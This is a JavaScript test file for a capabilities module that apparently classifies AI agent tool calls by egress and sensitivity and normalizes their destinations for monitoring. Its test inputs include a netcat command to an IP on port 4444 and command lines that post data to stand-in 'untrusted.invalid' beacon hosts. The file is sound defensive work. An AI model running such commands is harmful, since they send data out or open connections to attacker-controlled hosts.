import { test } from "node:test";
import assert from "node:assert/strict";
import {
  capabilityOf,
  destinationOf,
  isKnownTool,
  knownTools,
  normalizeDestination,
} from "../src/capabilities.js";

test("known tools expose ingest, sensitivity, and egress", () => {
  const secret = capabilityOf("secrets.read");
  assert.equal(secret.ingest, 0);
  assert.equal(secret.sensitivity, 1);
  assert.equal(secret.egress, 0);

  const post = capabilityOf("http.post");
  assert.equal(post.kind, "egress");
  assert.equal(post.egress, 1);
  assert.equal(isKnownTool("http.post"), true);
  assert.ok(knownTools().length > 10);
});

test("unknown tools get a conservative midpoint capability", () => {
  const unknown = capabilityOf("custom.mystery");
  assert.equal(unknown.kind, "unknown");
  assert.equal(unknown.ingest, 0.5);
  assert.equal(unknown.egress, 0.5);
  assert.equal(isKnownTool("custom.mystery"), false);
});

test("urls normalize to their host", () => {
  assert.equal(normalizeDestination("https://API.Example.com/v1/hooks"), "api.example.com");
  assert.equal(normalizeDestination("https://api.example.com:8443/x"), "api.example.com:8443");
  assert.equal(normalizeDestination("  https://api.example.com/a  "), "api.example.com");
});

test("a bare address normalizes to its domain", () => {
  assert.equal(normalizeDestination("Billing@Acme.COM"), "acme.com");
  assert.equal(normalizeDestination("git@forge.example:acme/platform.git"), "forge.example:acme/platform.git");
});

test("a command line normalizes to the endpoint it talks to", () => {
  assert.equal(
    normalizeDestination("status-report --endpoint https://collect.untrusted.invalid/report"),
    "collect.untrusted.invalid",
  );
  assert.equal(normalizeDestination("nc 203.0.113.9 4444"), "203.0.113.9");
});

test("a command line with no endpoint normalizes to the program", () => {
  // Keying on the whole invocation would make every deploy a first contact, so
  // an ops agent could never build the reputation that keeps its work quiet.
  assert.equal(normalizeDestination("npm test --silent"), "npm");
  assert.equal(normalizeDestination("kubectl rollout status deploy/billing-3"), "kubectl");
  assert.equal(normalizeDestination("/usr/bin/node scripts/validate-config.js"), "node");
  assert.equal(
    normalizeDestination("kubectl rollout status deploy/billing-3"),
    normalizeDestination("kubectl rollout status deploy/billing-7"),
    "two runs of the same program should share one identity",
  );
});

test("a command line carrying data out is still distinguished by its endpoint", () => {
  const local = normalizeDestination("node scripts/validate-config.js");
  const remote = normalizeDestination("node -e post() https://beacon.untrusted.invalid/x");
  assert.notEqual(local, remote);
  assert.equal(remote, "beacon.untrusted.invalid");
});

test("destinationOf reads the capability-declared param", () => {
  assert.equal(
    destinationOf({
      tool: "http.post",
      params: { url: "https://prod-deploy.internal.example/release" },
    }),
    "prod-deploy.internal.example",
  );
  assert.equal(destinationOf({ tool: "email.send", params: { to: "ops@acme.example" } }), "acme.example");
  assert.equal(destinationOf({ tool: "slack.post", params: { channel: "#deployments" } }), "#deployments");
  assert.equal(destinationOf({ tool: "pkg.install", params: { package: "acme-sdkk" } }), "acme-sdkk");
});

test("tools with nowhere to send have no destination", () => {
  assert.equal(destinationOf({ tool: "secrets.read", params: { name: "DEPLOY_TOKEN" } }), null);
  assert.equal(destinationOf({ tool: "fs.write", params: { path: "/tmp/out" } }), null);
  assert.equal(destinationOf({ tool: "http.post", params: {} }), null);
});
